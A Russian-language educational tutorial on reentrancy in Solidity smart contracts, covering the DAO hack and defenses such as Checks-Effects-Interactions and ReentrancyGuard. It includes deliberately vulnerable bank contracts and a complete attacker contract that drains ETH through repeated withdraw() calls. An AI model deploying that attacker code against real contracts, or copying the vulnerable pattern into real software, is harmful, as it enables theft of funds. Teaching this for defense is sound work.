# Reentrancy атаки (Повторный вход)

Reentrancy (повторный вход) — одна из самых известных и разрушительных уязвимостей в смарт-контрактах. Эта атака позволяет злоумышленнику многократно вызывать функцию контракта до того, как завершится первоначальный вызов, что приводит к некорректному обновлению состояния и потере средств.

## Механизм атаки

### Как работает Reentrancy?

Атака эксплуатирует особенность взаимодействия контрактов в Ethereum:

1. Контракт-жертва отправляет ETH на адрес злоумышленника
2. Если адрес злоумышленника — это контракт, вызывается его функция `receive()` или `fallback()`
3. Внутри этой функции атакующий контракт снова вызывает функцию вывода у жертвы
4. Поскольку баланс ещё не обновлён, проверка проходит успешно
5. Цикл повторяется до исчерпания средств контракта

```
┌─────────────────┐                    ┌─────────────────┐
│  Контракт       │                    │  Контракт       │
│  Злоумышленника │                    │  Жертвы         │
└────────┬────────┘                    └────────┬────────┘
         │                                      │
         │  1. withdraw()                       │
         │─────────────────────────────────────>│
         │                                      │
         │  2. Проверка баланса (OK)            │
         │                                      │
         │  3. Отправка ETH                     │
         │<─────────────────────────────────────│
         │                                      │
         │  4. receive() срабатывает            │
         │  5. Снова вызов withdraw()           │
         │─────────────────────────────────────>│
         │                                      │
         │  6. Баланс ещё не обновлён!          │
         │  7. Проверка проходит                │
         │  8. Снова отправка ETH               │
         │<─────────────────────────────────────│
         │                                      │
         │  ... цикл повторяется ...            │
         │                                      │
```

## Уязвимый код

### Пример 1: Простой банк

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// УЯЗВИМЫЙ КОНТРАКТ - НЕ ИСПОЛЬЗОВАТЬ!
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No funds");

        // УЯЗВИМОСТЬ: Отправка ETH ДО обновления баланса
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // Баланс обновляется ПОСЛЕ отправки
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### Контракт атакующего

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public immutable bank;
    address public owner;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    // Начало атаки
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Депозит для получения права на вывод
        bank.deposit{value: 1 ether}();

        // Первый вызов withdraw
        bank.withdraw();
    }

    // Эта функция вызывается при получении ETH
    receive() external payable {
        // Пока в банке есть средства, продолжаем выводить
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // Вывод украденных средств
    function collectFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
```

## The DAO Hack (2016)

### Что произошло?

The DAO (Decentralized Autonomous Organization) был инвестиционным фондом на Ethereum, собравшим ~$150 млн в ETH. 17 июня 2016 года злоумышленник эксплуатировал reentrancy уязвимость и украл около 3.6 млн ETH (~$60 млн на тот момент).

### Уязвимый код The DAO

```solidity
// Упрощённая версия уязвимой функции splitDAO
function splitDAO(
    uint _proposalID,
    address _newCurator
) noEther onlyTokenholders returns (bool _success) {
    // ... проверки ...

    uint fundsToBeMoved =
        (balances[msg.sender] * p.splitData[0].totalSupply) /
        p.splitData[0].totalSupply;

    // УЯЗВИМОСТЬ: Вызов внешнего контракта ДО обновления состояния
    if (!p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender)) {
        revert();
    }

    // Обновление баланса происходит ПОСЛЕ внешнего вызова
    balances[msg.sender] = 0;

    // ...
}
```

### Последствия

- Ethereum сообщество провело хардфорк для возврата средств
- Сеть разделилась на Ethereum (ETH) и Ethereum Classic (ETC)
- Событие навсегда изменило подход к безопасности смарт-контрактов

## Способы защиты

### 1. Паттерн Checks-Effects-Interactions (CEI)

Самый важный паттерн для предотвращения reentrancy:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        // 1. CHECKS - все проверки
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No funds");

        // 2. EFFECTS - изменение состояния
        balances[msg.sender] = 0;

        // 3. INTERACTIONS - внешние вызовы в самом конце
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```

### 2. ReentrancyGuard от OpenZeppelin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Модификатор nonReentrant блокирует повторный вход
    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No funds");

        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```

### Как работает ReentrancyGuard?

```solidity
// Упрощённая реализация
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}
```

### 3. Использование transfer() или send() (устаревший метод)

```solidity
// НЕ РЕКОМЕНДУЕТСЯ - ограничение в 2300 gas может вызвать проблемы
function withdraw() external {
    uint256 balance = balances[msg.sender];
    require(balance > 0, "No funds");

    balances[msg.sender] = 0;

    // transfer автоматически revert при ошибке
    payable(msg.sender).transfer(balance);
}
```

**Важно**: `transfer()` и `send()` ограничивают газ до 2300, что раньше считалось защитой от reentrancy. Однако после Istanbul хардфорка стоимость gas изменилась, и этот метод больше не рекомендуется, так как может приводить к ошибкам при отправке на некоторые контракты.

## Виды Reentrancy атак

### 1. Single-Function Reentrancy

Классический случай — повторный вход в ту же функцию:

```solidity
function withdraw() external {
    // Атакующий снова вызывает withdraw()
}
```

### 2. Cross-Function Reentrancy

Атака через другую функцию, использующую то же состояние:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// УЯЗВИМЫЙ КОНТРАКТ
contract VulnerableCrossFunction {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No funds");

        // Во время этого вызова атакующий может вызвать transfer()
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}
```

### 3. Cross-Contract Reentrancy

Атака через несколько связанных контрактов:

```solidity
// Контракт A вызывает контракт B, который вызывает обратно контракт A
```

### 4. Read-Only Reentrancy

Манипуляция состоянием во время view-вызовов:

```solidity
// Контракт возвращает устаревшие данные во время reentrancy
function getPrice() external view returns (uint256) {
    return totalAssets / totalSupply; // Может вернуть неверное значение
}
```

## Best Practices

### 1. Всегда используйте CEI паттерн

```solidity
function secureFunction() external {
    // 1. Checks
    require(condition, "Error");

    // 2. Effects
    state = newValue;

    // 3. Interactions
    externalCall();
}
```

### 2. Используйте ReentrancyGuard для критических функций

```solidity
function criticalFunction() external nonReentrant {
    // Защищённая логика
}
```

### 3. Будьте осторожны с callback-функциями

```solidity
// ERC721 safeTransferFrom вызывает onERC721Received
// ERC777 имеет hooks при transfer
// Flashloan callbacks
```

### 4. Аудит cross-contract взаимодействий

- Проверяйте все внешние вызовы
- Анализируйте зависимости между контрактами
- Используйте инструменты статического анализа

### 5. Тестирование на reentrancy

```solidity
// Тест с Foundry
function testReentrancyAttack() public {
    Attacker attacker = new Attacker(address(bank));

    // Попытка атаки должна провалиться
    vm.expectRevert("ReentrancyGuard: reentrant call");
    attacker.attack{value: 1 ether}();
}
```

## Инструменты для обнаружения

### Slither

```bash
slither . --detect reentrancy-eth,reentrancy-no-eth,reentrancy-benign
```

### Mythril

```bash
myth analyze contracts/Bank.sol --solc-json mythril.config.json
```

## Checklist безопасности

- [ ] Все внешние вызовы выполняются в конце функции (CEI)
- [ ] Критические функции защищены ReentrancyGuard
- [ ] Проверены cross-function reentrancy сценарии
- [ ] Учтены callback-функции (ERC721, ERC777, flashloans)
- [ ] Проведён статический анализ кода
- [ ] Написаны тесты на reentrancy атаки

## Заключение

Reentrancy — это фундаментальная уязвимость, понимание которой обязательно для каждого Solidity-разработчика. Всегда следуйте паттерну Checks-Effects-Interactions и используйте ReentrancyGuard для дополнительной защиты. Помните: в мире смарт-контрактов ошибка в одной строке кода может стоить миллионы долларов.
